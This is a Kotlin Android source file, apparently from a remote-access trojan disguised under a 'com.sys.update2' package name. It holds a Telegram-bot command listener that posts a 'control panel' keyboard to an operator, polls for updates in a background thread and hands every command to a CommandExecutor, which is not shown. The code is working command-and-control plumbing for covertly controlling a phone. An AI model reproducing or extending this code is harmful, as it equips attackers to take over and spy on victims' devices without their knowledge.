package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var worker: Thread? = null
    private var offset = 0L

    private val processedIds = java.util.Collections.synchronizedSet(HashSet<Int>())

    fun start(ctx: Context) {
        if (running) return
        running = true

        // ⭐ عند التشغيل — اعرض الأزرار مرة واحدة
        try {
            TelegramApi.sendMessage(
                "🎛 *لوحة التحكم — CREFTEX*\n\n" +
                "الأزرار جاهزة 👇",
                KeyboardBuilder.replyKeyboard()
            )
        } catch (_: Exception) {}

        worker = thread(name = "telegram-poll") {
            while (running) {
                try {
                    poll(ctx)
                } catch (e: Exception) {
                    Log.e("CmdListener", "poll err: ${e.message}")
                    Thread.sleep(2000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun poll(ctx: Context) {
        try {
            val updates = TelegramApi.getUpdates(offset)
            if (updates == null) {
                Thread.sleep(2000)
                return
            }

            for (i in 0 until updates.length()) {
                val update = updates.optJSONObject(i) ?: continue
                val updateId = update.optLong("update_id", 0).toInt()
                offset = updateId.toLong() + 1

                if (processedIds.contains(updateId)) continue
                processedIds.add(updateId)

                processUpdate(ctx, update)
            }

            // لا تحديثات → انتظر قليلًا
            if (updates.length() == 0) {
                Thread.sleep(1000)
            }

        } catch (e: Exception) {
            Log.e("CmdListener", "poll err: ${e.message}")
            Thread.sleep(3000)
        }
    }

    private fun processUpdate(ctx: Context, update: JSONObject) {
        try {
            // Callback (زر Inline)
            update.optJSONObject("callback_query")?.let { cb ->
                val data = cb.optString("data", "")
                val cbId = cb.optString("id", "")
                if (data.isNotBlank()) {
                    TelegramApi.answerCallback(cbId)
                    CommandExecutor.handle(ctx, data, cbId)
                }
                return
            }

            // Message (نص)
            update.optJSONObject("message")?.let { msg ->
                val text = msg.optString("text", "").trim()
                if (text.isNotBlank()) {
                    CommandExecutor.handleText(ctx, text)
                }
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "process err: ${e.message}")
        }
    }
}
